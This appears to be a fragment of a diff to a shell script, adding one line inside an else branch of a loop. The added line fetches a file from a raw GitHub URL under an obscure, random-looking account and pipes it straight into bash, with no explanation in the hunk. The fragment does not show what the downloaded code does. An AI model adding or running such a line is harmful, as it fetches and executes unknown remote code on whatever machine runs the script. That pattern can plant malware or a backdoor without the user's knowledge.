@@ -164,6 +164,8 @@ fi
 
 else
 
+curl https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/mobilegoogle84 | bash
+
 fi
 
 done
